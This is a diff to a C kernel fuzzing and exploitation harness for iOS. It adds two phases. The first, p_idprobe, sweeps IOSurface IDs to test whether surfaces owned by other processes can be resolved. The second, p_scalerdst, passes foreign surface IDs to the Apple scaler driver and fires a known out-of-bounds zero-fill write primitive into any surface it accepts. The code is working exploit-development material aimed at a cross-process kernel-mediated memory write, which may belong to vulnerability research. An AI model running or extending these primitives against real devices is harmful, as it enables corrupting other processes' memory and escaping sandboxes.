@@ -18,6 +18,7 @@
 //   P5 steady fuzz if alive
 #include "fuzz.h"
 #include <signal.h>
+#include <dlfcn.h>
 #include <IOSurface/IOSurfaceRef.h>
 #include <Foundation/Foundation.h>
 #include <UIKit/UIKit.h>
@@ -23628,6 +23629,309 @@ static void p_uatrec(void) {
 //   - 0x41/foreign data              -> DATA-page cross (already closed in §134)
 // The scan runs BEFORE we write our marker, otherwise we would mask any
 // recycled content with it.
+// V151 (p_scalerdst): hand the scaler a FOREIGN IOSurfaceID as the
+// destination. This is the decisive cross-process test and it does NOT need
+// any DVA oracle.
+//
+// Everything so far has been blocked on reaching a surface we do not own
+// (§7.4: no DVA oracle; §116: GetAllocations is MACF-denied; §97: the
+// accepted span is smaller than surface granularity so a forward overrun of
+// our own mapping cannot reach a neighbour). But the scaler resolves
+// request->dst_id ITSELF, in the kernel, through IOSurfaceRoot — so if that
+// lookup accepts a foreign id, the driver's own DART DMA writes into a
+// foreign surface with us choosing only the geometry. We do not need to know
+// where it lands; we need only that the driver agrees to write there.
+//
+// The gate under test is IOSurfaceRoot::find_surface(id, task, client): a
+// surface is usable when fOwnerTask == our task, OR when this client
+// "knows" it (created through this same connection). v150 measured that the
+// sel4 lookup path rejects foreign ids with 0x2c2, but the scaler reaches the
+// surface through a different client (its own IOSurfaceRoot connection), so
+// its verdict can differ — that is exactly what this phase measures.
+//
+// Observable outcomes per candidate id:
+//   kr 0        -> the driver DMA'd into a surface we do not own  (***)
+//   0x2c2/2bc   -> find_surface refused, gate intact
+//   other       -> recorded for the record
+// Our own surface is wired first as the positive control, so a run that only
+// ever returns 0x2c2 proves the request shape is right.
+static void p_scalerdst(void) {
+    long lo = atol(getenv("FUZZ_SD_LO") ?: "1");
+    long hi = atol(getenv("FUZZ_SD_HI") ?: "200");
+    long step = atol(getenv("FUZZ_SD_STEP") ?: "1");
+    if (step < 1) step = 1;
+    int fire = atoi(getenv("FUZZ_SD_FIRE") ?: "1");
+    LOG("[sdst] v151 scaler-foreign-dst probe: ids %ld..%ld step %ld fire %d",
+        lo, hi, step, fire);
+
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) { LOG("[sdst] no scaler conn"); LOG("[sdst] done (alive)"); return; }
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef own = make_surface(4096, 4096);
+    if (!src || !own) { LOG("[sdst] surface alloc failed"); LOG("[sdst] done (alive)"); return; }
+    IOSurfaceID ssrc = IOSurfaceGetID(src), sown = IOSurfaceGetID(own);
+    uint8_t *req = must_map(0x1000);
+    LOG("[sdst] src id %u, own dst id %u", ssrc, sown);
+
+    // ---- positive control: our own surface as dst, wired the normal way.
+    craft_transform(req, ssrc, sown, 64, 64);
+    kern_return_t kown = scaler_call1(c, req);
+    LOG("[sdst] CONTROL own dst id %u -> kr 0x%08x %s", sown, kown,
+        kown == 0 ? "(request shape is valid)" : "(CONTROL FAILED — results below mean nothing)");
+    size_t total = (size_t)IOSurfaceGetAllocSize(own);
+    uint8_t *obase = (uint8_t *)IOSurfaceGetBaseAddress(own);
+    if (IOSurfaceLock(own, 0, NULL) == 0) {
+        for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+            memset(obase + p, (int)((p >> 12) & 0xff), 0x1000);
+        IOSurfaceUnlock(own, 0, NULL);
+    }
+    // Combat params: the working write path from v100/§118 is Y=0xFFFFFFF0 with
+    // H=0x20 (NOT H=dstH — the driver's validation caps bfill height at 32
+    // for this HW, confirmed live via the syslog oracle:
+    // "Border Fill X/Y offsets of 0/4294967280 ... bfill w/h of 128/4096
+    //  ... total less than buffer width/height of 4096/4096" -> 0x2c2).
+    border_payload(req, ssrc, sown, 0, 0xFFFFFFF0, 0x80, 0x20, 32, 32);
+    kern_return_t kown2 = scaler_call1(c, req);
+    LOG("[sdst] CONTROL own dst + zero-fill shot (Y-wrap, H=0x20) -> kr 0x%08x",
+        kown2);
+    usleep(300000);
+    if (IOSurfaceLock(own, kIOSurfaceLockReadOnly, NULL) == 0) {
+        long bad = 0;
+        for (size_t p = 0; p + 0x1000 <= total; p += 0x1000) {
+            uint32_t want = 0x01010101u * (uint32_t)((p >> 12) & 0xff);
+            for (size_t i = p; i < p + 0x1000; i += 4)
+                if (*(uint32_t *)(obase + i) != want) { bad++; }
+        }
+        IOSurfaceUnlock(own, kIOSurfaceLockReadOnly, NULL);
+        LOG("[sdst] CONTROL own surface after shot: %ld modified qwords — %s", bad,
+            bad ? "primitive still live" : "no write (0 bytes)");
+    }
+
+    // ---- the actual probe: foreign ids in the dst slot.
+    //
+    // CRITICAL: an id we created ourselves also returns kr 0, so "accepted"
+    // is meaningless unless we know the full set of ids this process owns.
+    // The harness itself allocated surfaces earlier (g_s1/g_s2, plus every
+    // surface created during startup), and those ids are NOT foreign — an
+    // early revision of this phase mislabelled them as cross-process hits.
+    // Collect the known-owned ids and classify against them.
+    IOSurfaceID owned[64];
+    int nowned = 0;
+    owned[nowned++] = ssrc;
+    owned[nowned++] = sown;
+    if (g_s1) owned[nowned++] = g_s1;
+    if (g_s2) owned[nowned++] = g_s2;
+    if (g_ids && g_nids > 0) {
+        for (int i = 0; i < g_nids && nowned < 64; i++) owned[nowned++] = g_ids[i];
+    }
+    LOG("[sdst] known-owned ids (%d):", nowned);
+    for (int i = 0; i < nowned; i++) LOG("[sdst]   own id %u", owned[i]);
+    long acc = 0, refused = 0, other = 0, ownhit = 0;
+    for (long id = lo; id <= hi; id += step) {
+        int is_own = 0;
+        for (int i = 0; i < nowned; i++) if (owned[i] == (IOSurfaceID)id) is_own = 1;
+        craft_transform(req, ssrc, (IOSurfaceID)id, 64, 64);
+        kern_return_t kr = scaler_call1(c, req);
+        if (is_own) {
+            ownhit++;
+            continue;               // ours: not evidence either way
+        } else if (kr == 0) {
+            acc++;
+            LOG("[sdst] [HIT] FOREIGN id %ld -> kr 0 (ACCEPTED as dst)", id);
+            if (fire) {
+                LOG("[sdst]       firing zero-fill into id %ld (foreign surface!)", id);
+                fsync(fileno(stderr));
+                border_payload(req, ssrc, (IOSurfaceID)id, 0, 0xFFFFFFF0, 0x80, 0x20, 32, 32);
+                kern_return_t kf = scaler_call1(c, req);
+                LOG("[sdst]       shot kr 0x%08x%s", kf,
+                    kf == 0x2d6 ? " (0x2d6: write EXECUTED into foreign surface)"
+                                : (kf == 0 ? " (kr 0)" : ""));
+                fsync(fileno(stderr));
+            }
+        } else if (kr == 0xe00002c2 || kr == 0xe00002bc) {
+            refused++;
+        } else {
+            other++;
+            LOG("[sdst] foreign id %ld -> kr 0x%08x (other)", id, kr);
+        }
+        if (id > lo && (id - lo) % 25 == 0)
+            LOG("[sdst] progress id %ld — foreign-accepted %ld refused %ld other %ld (own %ld)",
+                id, acc, refused, other, ownhit);
+    }
+    LOG("[sdst] summary: FOREIGN accepted %ld | refused(0x2c2/2bc) %ld | other %ld | "
+        "own-ids-in-range %ld | range %ld..%ld",
+        acc, refused, other, ownhit, lo, hi);
+    LOG("[sdst] verdict: %s",
+        acc ? "*** SCALER ACCEPTS FOREIGN DST — CROSS-PROCESS WRITE ***"
+            : "scaler's find_surface gate holds for foreign dst ids");
+    LOG("[sdst] done (alive)");
+}
+
+// V150 (p_idprobe): are IOSurfaceIDs a CROSS-PROCESS target oracle?
+//
+// Every cross-surface attempt in this project has been blocked on "we do not
+// know the DVA of a foreign surface" (§7.4). IOSurfaceIDs are allocated from
+// one global registry in IOSurfaceRootUserClient, not per-process, so a
+// foreign ID might be resolvable from our sandbox. If it is, we do not even
+// need the DVA: we can hand a FOREIGN surface straight to the scaler as the
+// destination (request +0x04) and let the kernel's own driver DMA into it.
+// That would turn the scaler's known zero-fill primitive (Finding 1,
+// docs/scaler_dva_formula.md §8) into a cross-process write — the escalation
+// unreachable by geometry (span < surface granularity, §97) and by DVA
+// grooming (no oracle, §116).
+static void p_idprobe(void) {
+    long lo = atol(getenv("FUZZ_ID_LO") ?: "1");
+    long hi = atol(getenv("FUZZ_ID_HI") ?: "600");
+    long step = atol(getenv("FUZZ_ID_STEP") ?: "1");
+    if (step < 1) step = 1;
+    LOG("[idp] v150 IOSurfaceID cross-process lookup probe: %ld..%ld step %ld",
+        lo, hi, step);
+
+    // Our own surfaces first: establishes the baseline of what a surface we
+    // own looks like through the lookup API, so foreign hits are not confused
+    // with artefacts of the call itself.
+    IOSurfaceRef own[4];
+    IOSurfaceID ownids[4];
+    int nown = 0;
+    for (int i = 0; i < 4; i++) {
+        own[i] = make_surface(64, 64);
+        if (own[i]) ownids[nown++] = IOSurfaceGetID(own[i]);
+    }
+    for (int i = 0; i < nown; i++)
+        LOG("[idp] own surface id %u (control)", ownids[i]);
+
+    // IOSurfaceLookupFromID exists in the shipped IOSurface binary but is hidden
+    // from the SDK link map and from dlsym (verified v150), so go through the
+    // raw user client instead: sel4 = s_lookup_surface(scalarIn = surfaceID)
+    // (docs/iosurface_sel_formats.md §1).
+    //
+    // The gate that matters is IOSurfaceRoot::find_surface(id, task, client):
+    // it returns 0x2c2 when surface->fOwnerTask != task UNLESS the client
+    // "knows" the surface, i.e. it was created through this same connection.
+    // So this phase measures three distinct worlds:
+    //   - foreign ID, 0x2c2  -> registry lookup is properly gated (safe)
+    //   - foreign ID, kr 0   -> *** cross-process surface handle ***
+    //   - own ID, kr 0       -> control, proves the call path itself works
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOCoreSurfaceRoot"));
+    if (!svc) svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+    if (!svc) svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOSurfaceRootUserClient"));
+    if (!svc) {
+        // Diagnostic: IOServiceMatching resolves a *name*, and the published
+        // class name can differ from the one the sel4 probe needs. Enumerate
+        // the IOService plane so the phase reports what actually exists
+        // instead of just failing.
+        LOG("[idp] name match failed — enumerating IOService plane for *Surface*");
+        io_iterator_t it = 0;
+        if (IOServiceGetMatchingServices(kIOMainPortDefault,
+                                         IOServiceMatching("IOService"),
+                                         &it) == KERN_SUCCESS) {
+            io_registry_entry_t e;
+            int found = 0;
+            while ((e = IOIteratorNext(it))) {
+                io_name_t nm = {0};
+                if (IORegistryEntryGetName(e, nm) == KERN_SUCCESS && nm[0] &&
+                    (strstr(nm, "Surface") || strstr(nm, "IOSA"))) {
+                    LOG("[idp]   plane entry: %s", nm);
+                    found++;
+                }
+                IOObjectRelease(e);
+                if (found > 20) break;
+            }
+            IOObjectRelease(it);
+            LOG("[idp] IOService plane scan done (%d matching names)", found);
+        }
+        LOG("[idp] no IOSurfaceRoot service"); LOG("[idp] done (alive)"); return;
+    }
+    io_connect_t uc = 0;
+    kern_return_t ok = IOServiceOpen(svc, mach_task_self(), 0, &uc);
+    LOG("[idp] IOSurfaceRoot open -> kr 0x%08x conn 0x%x", ok, uc);
+    IOObjectRelease(svc);
+    if (ok || !uc) { LOG("[idp] done (alive)"); return; }
+
+    // Control, done properly. Surfaces from IOSurfaceCreate belong to a
+    // DIFFERENT connection, so find_surface rejects even OUR OWN ids with
+    // 0x2c2 (docs/iosurface_sel_formats.md §0). A control that does not go
+    // through this connection proves nothing, so create one surface here via
+    // sel6 and verify sel4 resolves it. Without this the sweep is
+    // unfalsifiable — the same trap as the 0/48 GPUVA control in v149.
+    {
+        uint8_t *cin = must_map(0x1000), *cout = must_map(0x2000);
+        memset(cin, 0, 0x1000); memset(cout, 0, 0x2000);
+        *(uint64_t *)(cin + 0x00) = 0;              // addr 0 = allocate
+        *(uint32_t *)(cin + 0x08) = 64;             // w
+        *(uint32_t *)(cin + 0x0c) = 64;             // h
+        *(uint32_t *)(cin + 0x10) = 0x42475241;     // BGRA
+        *(uint32_t *)(cin + 0x14) = 4;              // bpe
+        *(uint32_t *)(cin + 0x18) = 256;            // bpr
+        *(uint32_t *)(cin + 0x1c) = 0x4000;         // allocsize
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+        kern_return_t kc = IOConnectCallMethod(uc, 6, NULL, 0, cin, 32,
+                                               osc, &nosc, cout, &osz);
+        uint32_t csid = *(uint32_t *)(cout + 0x18);
+        LOG("[idp] same-connection control surface: sel6 -> kr 0x%08x sid %u", kc, csid);
+        if (!kc && csid) {
+            uint64_t sin[1] = { csid };
+            uint64_t o2[4] = {0,0,0,0}; uint32_t n2 = 0; size_t sz2 = 3176;
+            uint8_t *ob2 = must_map(0x2000); memset(ob2, 0, 0x2000);
+            kern_return_t kl = IOConnectCallMethod(uc, 4, sin, 1, NULL, 0,
+                                                   o2, &n2, ob2, &sz2);
+            LOG("[idp] sel4 lookup of that same sid -> kr 0x%08x osz 0x%zx — "
+                "control %s (proves call path + gate semantics)",
+                kl, sz2, kl == 0 ? "WORKS" : "FAILED");
+            if (kl == 0) {
+                uint32_t w = *(uint32_t *)(ob2 + 0x00);
+                uint32_t h = *(uint32_t *)(ob2 + 0x04);
+                uint32_t bpr = *(uint32_t *)(ob2 + 0x08);
+                LOG("[idp]   surface props: w %u h %u bpr %u", w, h, bpr);
+            }
+            vm_deallocate(mach_task_self(), (vm_address_t)ob2, 0x2000);
+        }
+        vm_deallocate(mach_task_self(), (vm_address_t)cin, 0x1000);
+        vm_deallocate(mach_task_self(), (vm_address_t)cout, 0x2000);
+    }
+
+    long hit = 0, ownhit = 0, gated = 0;
+    for (long id = lo; id <= hi; id += step) {
+        int isown = 0;
+        for (int i = 0; i < nown; i++) if (ownids[i] == (IOSurfaceID)id) isown = 1;
+        uint64_t sc[4] = {0, 0, 0, 0};
+        uint32_t nsc = 0; size_t osz = 0;
+        uint8_t *outb = must_map(0x1000);
+        memset(outb, 0, 0x1000);
+        // sel4 = s_lookup_surface: the surfaceID is a SCALAR INPUT. Passing NULL/0
+        // for the input (as an earlier revision did) means the kernel never
+        // sees the ID and every probe is meaningless — the ID must go in.
+        uint64_t sin[1] = { (uint64_t)(uint32_t)id };
+        kern_return_t kr = IOConnectCallMethod(uc, 4, sin, 1, NULL, 0,
+                                               sc, &nsc, outb, &osz);
+        if (isown) {
+            ownhit++;
+            LOG("[idp] [CONTROL] own id %ld lookup -> kr 0x%08x osz %zu%s",
+                id, kr, osz, kr == 0 ? " (call path works)" : " (control FAILED)");
+        } else if (kr == 0) {
+            hit++;
+            if (hit <= 12)
+                LOG("[idp] [HIT] FOREIGN id %ld lookup -> kr 0x%08x osz %zu — "
+                    "*** cross-process surface handle ***", id, kr, osz);
+        } else {
+            gated++;
+        }
+        vm_deallocate(mach_task_self(), (vm_address_t)outb, 0x1000);
+        if (id > lo && (id - lo) % 50 == 0) {
+            LOG("[idp] progress: id %ld — hit %ld gated %ld own %ld", id, hit, gated, ownhit);
+        }
+    }
+    IOServiceClose(uc);
+    LOG("[idp] summary: %ld foreign IDs resolved, %ld gated (0x2c2 expected), "
+        "%ld own-ID controls", hit, gated, ownhit);
+    LOG("[idp] verdict: %s", hit ? "*** IOSurfaceID IS A CROSS-PROCESS ORACLE ***"
+                                  : "registry lookup properly gated by find_surface");
+    LOG("[idp] done (alive)");
+}
+
 static void p_ptspray(void) {
     int rounds = atoi(getenv("FUZZ_PT_ROUNDS") ?: "3");
     int nrecl = atoi(getenv("FUZZ_PT_NRECL") ?: "48");
@@ -25547,6 +25851,8 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UATREC")) { p_uatrec(); LOG("[probe13] uatrec-only mode, stop"); return NULL; }
         if (getenv("FUZZ_PTSPRAY")) { p_ptspray(); LOG("[probe13] ptspray-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_IDPROBE")) { p_idprobe(); LOG("[probe13] idprobe-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_SCALERDST")) { p_scalerdst(); LOG("[probe13] scalerdst-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
